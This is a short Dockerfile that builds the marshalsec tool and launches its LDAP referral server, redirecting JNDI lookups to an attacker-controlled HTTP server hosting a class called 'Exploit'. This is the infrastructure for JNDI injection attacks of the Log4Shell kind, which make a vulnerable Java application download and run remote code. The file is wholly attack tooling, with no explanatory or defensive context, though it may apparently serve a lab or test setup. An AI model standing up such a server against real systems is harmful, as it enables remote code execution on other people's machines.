FROM maven:3.8.7-eclipse-temurin-8 as builder
RUN git clone https://github.com/mbechler/marshalsec.git
WORKDIR /marshalsec
RUN mvn clean package -DskipTests

FROM openjdk:8-jdk-alpine
COPY --from=builder /marshalsec/target/marshalsec-*-all.jar /marshalsec.jar
CMD java -cp /marshalsec.jar marshalsec.jndi.LDAPRefServer "http://<http-server-ip>:8000/#Exploit"
